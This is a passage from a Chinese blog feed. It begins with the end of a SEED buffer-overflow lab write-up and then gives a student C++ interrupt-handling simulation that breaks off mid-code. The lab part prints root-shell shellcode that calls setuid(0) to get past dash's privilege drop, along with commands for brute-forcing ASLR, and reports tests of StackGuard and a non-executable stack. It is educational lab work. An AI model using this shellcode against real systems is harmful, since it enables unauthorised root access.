&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>在<code>dash</code>中实施的对策是可以被击败的。一种方法是不在shellcode中调用<code>/bin/sh</code>;相反，我们可以调用另一个shell程序。这种方法需要在系统中出现另一个shell程序，例如<code>zsh</code>。</p></li><li><p>另一种方法是在调用<code>dash</code>程序之前将受害进程的实际用户ID更改为零。我们可以通过在<code>shellcode</code>中执行<code>execve()</code>之前调用<code>setuid(0)</code>来实现这一点。在本任务中，我们将使用这种方法。我们将首先更改<code>/bin/sh</code>符号链接，使其指向<code>/bin/dash</code>：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">ln</span> -sf /bin/dash /bin/sh</span><br></code></pre></div></td></tr></table></figure></li></ul><p><strong>实验操作</strong></p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120211410681.png" alt="image-20211120211410681"></p><ul><li>为了了解dash中的对策是如何工作的，以及如何使用系统调用<code>setuid(0)</code>来击败它，我们编写了下面的C程序。</li><li>我们首先注释掉①行，并以Set-UID程序的形式运行该程序(所有者应该是root)；请描述一下你的观察。</li><li>然后取消对行①的注释，再次运行程序；请描述一下你的观察。</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dash_shell_test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> *argv[<span class="hljs-number">2</span>];<br>    argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// setuid(0); ①</span><br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, argv, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>上面的程序可以使用以下命令编译和设置(我们需要使它成为root拥有的set -uid程序):</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc dash_shell_test.c -o dash_shell_test</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> root dash_shell_test</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> 4755 dash_shell_test</span><br></code></pre></div></td></tr></table></figure></li><li><p>从上面的实验中，我们可以看到<code>seuid(0)</code>是有区别的。在调用<code>execve()</code>之前，让我们在shellcode的开头添加用于调用此系统调用的程序集代码。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\x31\xc0&quot;</span> <span class="hljs-comment">/* Line 1: xorl %eax,%eax */</span><br><span class="hljs-string">&quot;\x31\xdb&quot;</span> <span class="hljs-comment">/* Line 2: xorl %ebx,%ebx */</span><br><span class="hljs-string">&quot;\xb0\xd5&quot;</span> <span class="hljs-comment">/* Line 3: movb $0xd5,%al */</span><br><span class="hljs-string">&quot;\xcd\x80&quot;</span> <span class="hljs-comment">/* Line 4: int $0x80 */</span><br><span class="hljs-comment">// ---- The code below is the same as the one in Task 2 ---</span><br><span class="hljs-string">&quot;\x31\xc0&quot;</span><br><span class="hljs-string">&quot;\x50&quot;</span><br><span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span><br><span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span><br><span class="hljs-string">&quot;\x89\xe3&quot;</span><br><span class="hljs-string">&quot;\x50&quot;</span><br><span class="hljs-string">&quot;\x53&quot;</span><br><span class="hljs-string">&quot;\x89\xe1&quot;</span><br><span class="hljs-string">&quot;\x99&quot;</span><br><span class="hljs-string">&quot;\xb0\x0b&quot;</span><br><span class="hljs-string">&quot;\xcd\x80&quot;</span><br></code></pre></div></td></tr></table></figure><ul><li><p>更新后的shellcode增加了4条指令：</p><ul><li><p>(1)在第2行设置<code>ebx</code>为零，</p></li><li><p>(2)通过第1行和第3行设置<code>eax</code>为0xd5 (0xd5是<code>setuid()</code>的系统调用号)</p></li><li><p>(3)在第4行执行系统调用。</p></li></ul></li><li><p>使用这个shellcode，当<code>/bin/sh</code>链接到<code>/bin/dash</code>时，我们可以尝试对脆弱的程序进行攻击。</p></li><li>使用上面的shellcode修改<code>exploit.c</code>或<code>exploit.py</code>；再次尝试从Task 2进行攻击，看看能否获得<code>root shell</code>。</li><li>请描述和解释你的结果。</li></ul><h4 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a><strong>实验过程</strong></h4><ul><li><p>注释①的<code>dash_shell_test</code>：shell以$开头，uid=1000。</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120222256558.png" alt="image-20211120222256558"></p></li><li><p>没有注释①的<code>dash_shell_test</code>：shell以#开头，uid=0。</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120222827079.png" alt="image-20211120222827079"></p></li><li><p>使用上面的shellcode修改<code>exploit.c</code>，攻击如下：结果与任务2一致。</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120223322348.png" alt="image-20211120223322348"></p></li></ul><h3 id="2-6-任务4-击败地址随机化"><a href="#2-6-任务4-击败地址随机化" class="headerlink" title="2.6 任务4:击败地址随机化"></a>2.6 任务4:击败地址随机化</h3><ul><li>在32位Linux机器上，堆栈只有19位熵，这意味着堆栈基地址可以是$2^{19} = 524288$种的可能性。</li><li>这个数字并没有那么高，并且可以很容易地用蛮力方法耗尽。</li><li>在这个任务中，我们使用这种方法来击败32位VM上的地址随机化对策。</li><li>首先，我们使用下面的命令打开Ubuntu的地址随机化。我们运行Task 2中开发的相同攻击。请描述和解释你的观察。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo /sbin/sysctl -w kernel.randomize_va_space=2</span><br></code></pre></div></td></tr></table></figure><h4 id="实验过程1"><a href="#实验过程1" class="headerlink" title="实验过程1"></a><strong>实验过程1</strong></h4><ul><li><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120223819421.png" alt="image-20211120223819421"></p><ul><li>提示Segmentation fault，攻击失败。</li></ul></li><li><p>然后我们使用蛮力方法反复攻击脆弱的程序，希望我们放入坏文件中的地址最终是正确的。</p></li><li>您可以使用下面的shell脚本在无限循环中运行易受攻击的程序。</li><li>如果攻击成功，脚本将停止；否则，它将继续运行。</li><li>请耐心点，因为这可能需要一段时间。如果需要的话，让它运行一夜。</li><li>请描述一下你的观察。</li></ul><h4 id="实验过程2"><a href="#实验过程2" class="headerlink" title="实验过程2"></a><strong>实验过程2</strong></h4><ul><li><p>脚本<code>attack.sh</code>如下：</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120224432478.png" alt="image-20211120224432478"></p></li><li><p>运行结果：</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120224521975.png" alt="image-20211120224521975"></p></li></ul><h3 id="2-7-任务5-打开StackGuard保护"><a href="#2-7-任务5-打开StackGuard保护" class="headerlink" title="2.7 任务5:打开StackGuard保护"></a>2.7 任务5:打开StackGuard保护</h3><ul><li><p>在完成这个任务之前，请记住首先关闭地址随机化，否则您将不知道哪个保护有助于实现保护。在之前的任务中，我们在编译程序时禁用了<code>GCC</code>中的<code>StackGuard</code>保护机制。</p></li><li><p>在这个任务中，您可以考虑在<code>StackGuard</code>存在的情况下重复任务2。要做到这一点，您应该在没有<code>-fno-stack-protector</code>选项的情况下编译程序。</p></li><li><p>对于这个任务，您将重新编译易受攻击的程序<code>stack.c</code>，去使用<code>GCC StackGuard</code>，再次执行任务2，并报告您的观察结果。您可以报告观察到的任何错误消息。</p><p>(在GCC 4.3.3及以上版本中，StackGuard默认是启用的。因此，您必须使用前面提到的开关禁用StackGuard。在早期的版本中，默认情况下是禁用的。如果您使用较老的GCC版本，您可能不需要禁用StackGuard。)</p></li></ul><h4 id="实验过程-3"><a href="#实验过程-3" class="headerlink" title="实验过程"></a>实验过程</h4><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120232443052.png" alt="image-20211120232443052"></p><ul><li>检测到栈崩溃。夭折。</li></ul><h3 id="2-8-任务6-打开非可执行堆栈保护"><a href="#2-8-任务6-打开非可执行堆栈保护" class="headerlink" title="2.8 任务6:打开非可执行堆栈保护"></a>2.8 任务6:打开非可执行堆栈保护</h3><ul><li>在完成这个任务之前，请记住首先关闭地址随机化，否则您将不知道哪个保护有助于实现保护。</li><li>在前面的任务中，我们故意使堆栈可执行。在这个任务中，我们使用noexecstack选项重新编译脆弱的程序，并在任务2中重复攻击。你能得到一个shell吗?如果没有，是什么问题?这个保护方案如何使您的攻击变得困难?你应该在你的实验报告中描述你的观察和解释。</li><li>您可以使用以下说明来打开非可执行堆栈保护。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -o stack -fno-stack-protector -z noexecstack stack.c</span><br></code></pre></div></td></tr></table></figure><ul><li>需要注意的是，非可执行堆栈只会使在堆栈上运行shellcode变得不可能，但它并不能防止缓冲区溢出攻击，因为在利用缓冲区溢出漏洞之后，还有其他方法可以运行恶意代码。<code>return-to-libc</code>就是一个例子。我们为这次袭击设计了一个单独的实验。如果您感兴趣，请参阅我们的<code>return-to-libc</code>实验的详细信息。</li><li>如果你正在使用我们的Ubuntu 12.04/16.04虚拟机，这个非执行堆栈保护是否有效取决于CPU和你的虚拟机设置，因为这个保护取决于CPU提供的硬件特性。</li><li>如果您发现非可执行堆栈保护不起作用，请查看我们链接到实验室网页的文档(“non-executable stack Notes”)，看看文档中的说明是否可以帮助您解决问题。如果没有，那么你可能需要自己解决问题。</li></ul><h4 id="实验过程-4"><a href="#实验过程-4" class="headerlink" title="实验过程"></a>实验过程</h4><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120233109553.png" alt="image-20211120233109553"></p><ul><li>提示Segmentation fault，攻击失败。</li></ul>]]></content>
    
    
    <categories>
      
      <category>软件安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全实验</tag>
      
      <tag>计算机安全导论</tag>
      
      <tag>SeedUbuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++编程实现模拟中断处理</title>
    <link href="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/"/>
    <url>/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="实验一-中断处理"><a href="#实验一-中断处理" class="headerlink" title="实验一 中断处理"></a>实验一 中断处理</h1><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><ol><li><p>计算机系统工作过程中，若出现中断事件，硬件就把它记录在中断寄存器中。中断寄存器的每一位可与一个中断事件对应，当出现某中断事件后，对应的中断寄存器的某一位就被置成“1”。</p><ul><li>处理器每执行一条指令后，必须查中断寄存器，当中断寄存器内容不为“0”时，说明有中断事件发生。硬件把中断寄存器内容以及现行程序的断点存在主存的固定单元。操作系统分析保存在主存固定单元中的中断寄存器内容就可知道出现的中断事件的性质，从而作出相应的处理。</li><li>本实验中，用从键盘读入信息来模拟中断寄存器的作用，用计数器加1来模拟处理器执行了一条指令。每模拟一条指令执行后，从键盘读入信息且分析，当读入信息=0时，表示无中断事件发生，继续执行指令；当读入信息=1时，表示发生了时钟中断事件，转时钟中断处理程序。</li></ul></li><li><p>假定计算机系统有一时钟，它按电源频率（50Hz）产生中断请求信号，即每隔20毫秒产生一次中断请求信号，称时钟中断信号，时钟中断的间隔时间（20毫秒）称时钟单位。</p><ul><li>学生可按自己确定的频率在键盘上键入“0”或“1”来模拟按电源频率产生的时钟中断信号。</li></ul></li><li><p>中断处理程序应首先保护被中断的现行进程的现场（通用寄存器内容、断点等），现场信息可保存在进程控制块中；然后处理出现的中断事件，根据处理结果修改被中断进程的状态；最后转向处理器调度，由处理器调度选择可运行的进程，恢复现场使其运行。</p><ul><li>本实验主要模拟中断事件的处理，为简单起见可省去保护现场和处理器调度的工作。</li></ul></li><li><p>为模拟时钟中断的处理，先分析一下时钟中断的作用。利用时钟中断可计算日历时钟，也可作定时闹钟等。</p><ul><li>计算日历时钟——把开机时的时间存放在指定的称为“日历时钟”的工作单元中，用一计时器累计时钟中断次数。根据时钟中断的次数和时钟单位（20毫秒）以及开机时的日历时钟可计算出当前的精确的日历时钟。</li><li>定时闹钟——对需要定时的场合，可把轮到运行的进程的时间片值送到称为“定时闹钟”的工作单元中，每产生一次时钟中断就把定时闹钟值减1，当该值为“0”时，表示确定的时间已到，起到定时的作用。</li></ul></li><li><p>本实验的模拟程序可由两部分组成，一部分是模拟硬件产生时钟中断，另一部分模拟操作系统的时钟中断处理程序。模拟程序的算法如图。其中，保护现场和处理器调度的工作在编程序时可省去。约定处理器调度总是选择被中断进程继续执行。</p><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/202112042236893-16386294531741-16386294552202-16386294609153-16386294770574.png" alt="image-20211110141519912"></p></li></ol><h2 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h2><ul><li><p>字符数组（数据结构：数组）</p><ul><li><code>char *s_st;</code>：开机时间的字符串形式。</li><li><code>char *s_now;</code>：当前时间的字符串形式。</li></ul></li><li><p>time_t（长整型）：</p><ul><li><code>time_t st;</code>：开机时间自 1970 年 1 月 1 日以来经过的秒数。</li><li><code>time_t now;</code>： 当前时间自 1970 年 1 月 1 日以来经过的秒数。</li></ul></li><li><p>整型（int）：</p><ul><li><code>int count;</code>：（指令）计数器。</li><li><code>int timer;</code> ：（时间中断）计时器。</li><li><code>int wr;</code>：键盘输入信息。</li><li><code>int time_alarm</code>：定时闹钟（时钟单位为20毫秒）。</li><li><code>int p;</code>：距离开机时间经过的时间（单位：毫秒）。</li></ul></li></ul><h2 id="源程序及注释："><a href="#源程序及注释：" class="headerlink" title="源程序及注释："></a>源程序及注释：</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">time_t</span> st = <span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//基于当前系统的开机时间，自 1970 年 1 月 1 日以来经过的秒数。</span><br><span class="hljs-type">char</span> *s_st = <span class="hljs-built_in">ctime</span>(&amp;st); <span class="hljs-comment">//将开机时间转化为字符串形式;</span><br>cout &lt;&lt; <span class="hljs-string">&quot;开机时间为：&quot;</span> &lt;&lt; s_st;<br><span class="hljs-comment">//格式为：Www Mmm dd hh:mm:ss yyyy</span><br><span class="hljs-comment">//其中，Www 表示星期几，Mmm 是以字母表示的月份，dd 表示一月中的第几天，hh:mm:ss 表示时间，yyyy 表示年份。</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">//计数器</span><br><span class="hljs-type">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//计时器</span><br><span class="hljs-type">int</span> wr;<span class="hljs-comment">//键盘输入信息,“0”或“1”来模拟按电源频率产生的时钟中断信号</span><br><span class="hljs-type">int</span> time_alarm; <span class="hljs-comment">//定时闹钟</span><br>cout &lt;&lt; <span class="hljs-string">&quot;请输入定时闹钟：&quot;</span>;<br>cin &gt;&gt; time_alarm; <span class="hljs-comment">//置定时闹钟 （毫秒）</span><br><span class="hljs-keyword">while</span> (time_alarm != <span class="hljs-number">0</span>) <span class="hljs-comment">//当定时时钟不为0</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;执行了一条指令&quot;</span> &lt;&lt; endl;<br>count++; <span class="hljs-comment">//计数器加1</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入模拟的时钟中断信号：&quot;</span>;<br>cin &gt;&gt; wr; <span class="hljs-comment">//读入键盘输入信息</span><br><span class="hljs-keyword">if</span> (wr == <span class="hljs-number">1</span>) <span class="hljs-comment">//如果有时钟中断</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;时钟中断，保存现场&quot;</span> &lt;&lt; endl;<br>timer++; <span class="hljs-comment">//计时器加1；</span><br>time_alarm--; <span class="hljs-comment">//定时闹钟减1；</span><br>cout &lt;&lt; <span class="hljs-string">&quot;处理器调度&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-comment">//定时闹钟为0，结束循环，接下来计算当前日历时钟。</span><br><span class="hljs-type">int</span> p; <span class="hljs-comment">//距离开机时间经过的时间（单位：毫秒）</span><br>p = timer * <span class="hljs-number">20</span>;<br><span class="hljs-type">time_t</span> now = st + p / <span class="hljs-number">1000</span>; <span class="hljs-comment">// 当前时间自 1970 年 1 月 1 日以来经过的秒数</span><br><span class="hljs-type">char</span> *s_now = <span class="hljs-built_in">ctime</span>(&amp;now);<span class="hljs-comment">//将当前时间转化为字符串形式</span><br>cout &lt;&lt; s_now;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">//若要设置开机时间：将time_t st = time(0);替换如下：</span><br><span class="hljs-comment">struct tm timeptr;</span><br><span class="hljs-comment">int a;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入星期几(0-6)：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_wday;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入月(0-11)：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_mon;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入日(1-31)：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_mday;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入时(0-6)：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_hour;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入分(0-6)：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_min;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入秒(0-6)：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_sec;</span><br><span class="hljs-comment">cout &lt;&lt; &quot;请输入自1900年起的年数：&quot;;</span><br><span class="hljs-comment">cin &gt;&gt; timeptr.tm_year;</span><br><span class="hljs-comment">time_t st = mktime(&amp;timeptr); //基于当前系统的开机时间，自 1970 年 1 月 1 日以来经过的秒数。</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><h2 id="程序运行时的初值和运行结果"><a href="#程序运行时的初值和运行结果" class="headerlink" title="程序运行时的初值和运行结果"></a>程序运行时的初值和运行结果</h2><h3 id="初值："><a href="#初值：" class="headerlink" title="初值："></a>初值：</h3><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211113100649995-16386294841065-16386294859837.png" alt="image-20211113100649995"></p><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p>经过了50个定时闹钟，即1秒。</p><p><img src="/2021/11/17/%E5%AE%9E%E9%AA%8C%E4%B8%80%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/202112042236894-16386294887029.png" alt="image-20211113101128598"></p><h2 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h2><ul><li>将进程调度策略结合到本实验中，可选用时间片轮转的调度策略。给每个进程分配一个相同的时间片，每产生一次时钟中断经处理后，被中断进程时间片减1，时间片值!=0时，该进程优先运行，若时间片值=0且该进程尚未运行结束，则将它排入队尾，再给它分配一个时间片，直到所有的进程运行结束。应怎样设计进程控制块？各进程的状态怎样变化？在本实验的程序中加入处理器调度程序。</li></ul><h3 id="源代码如下："><a href="#源代码如下：" class="headerlink" title="源代码如下："></a>源代码如下：</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 1000000</span><br><br><span class="hljs-type">int</span> n, q, temp_q; <span class="hljs-comment">//进程数，时间片大小，当前时间片大小</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">process</span><br>&#123;<br><span class="hljs-type">int</span> id; <span class="hljs-comment">//编号</span><br><span class="hljs-type">int</span> pos; <span class="hljs-comment">//排序后的位置</span><br><span class="hljs-type">int</span> arrive; <span class="hljs-comment">//到达时间</span><br><span class="hljs-type">int</span> work; <span class="hljs-comment">//区间时间</span><br><span class="hljs-type">int</span> begin; <span class="hljs-comment">//开始时间</span><br><span class="hljs-type">int</span> end; <span class="hljs-comment">//完成时间</span><br><span class="hljs-type">int</span> turnaround; <span class="hljs-comment">//周转时间</span><br><span class="hljs-type">int</span> wait; <span class="hljs-comment">//等待时间</span><br><span class="hljs-type">bool</span> in; <span class="hljs-comment">//是否进入过就绪队列</span><br><span class="hljs-type">bool</span> finish; <span class="hljs-comment">//是否完成</span><br><span class="hljs-type">int</span> rest; <span 